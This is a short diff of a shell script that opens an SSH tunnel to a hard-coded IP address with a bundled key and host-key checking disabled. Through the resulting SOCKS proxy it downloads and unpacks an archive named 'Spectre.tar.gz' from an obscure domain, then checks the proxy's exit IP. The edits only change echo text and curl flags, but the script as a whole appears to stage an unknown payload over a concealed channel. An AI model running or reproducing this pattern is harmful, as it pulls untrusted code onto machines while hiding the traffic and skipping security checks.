@@ -61,12 +61,13 @@ sleep 2
 ssh -i gituser -f -N -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L 1081:0.0.0.0:8443 -D 1080 git@45.135.56.238
 sleep 3
 
-echo "Testing the Socks5"
+echo "Checking Socks5 for SSH Tunnel"
+echo " "
 curl -x socks5h://127.0.0.1:1080 api.ipify.org
 echo " "
 sleep 2
 
-curl -x socks5h://127.0.0.1:1080 http://greenleaf.teatspray.uk/Spectre.tar.gz
+curl -x socks5h://127.0.0.1:1080 http://greenleaf.teatspray.uk/Spectre.tar.gz -L -O -J
 sleep 2
 
 tar -xf Spectre.tar.gz
@@ -76,7 +77,10 @@ sleep 2
 
 sleep 2
 
+echo "Checking Socks5 for Spectre"
+echo " "
 curl -x socks5h://127.0.0.1:1082 api.ipify.org
+echo " "
 
 sleep 2
 
